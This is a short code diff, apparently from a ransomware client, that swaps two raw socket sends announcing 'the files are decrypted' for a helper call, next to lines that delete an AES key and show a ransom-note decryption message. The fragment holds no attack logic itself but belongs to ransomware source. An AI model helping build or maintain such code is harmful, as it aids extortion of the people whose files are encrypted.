@@ -129,8 +129,7 @@ def main():
                     del aes_key
                     show_ransom_note_decryption()
                     
-                    secure_sock.sendall(b"the files are decrypted")
-                    secure_sock.sendall(b"__END__")
+                    send(secure_sock, "the files are decrypted")
                 
                 
                 sys.exit()
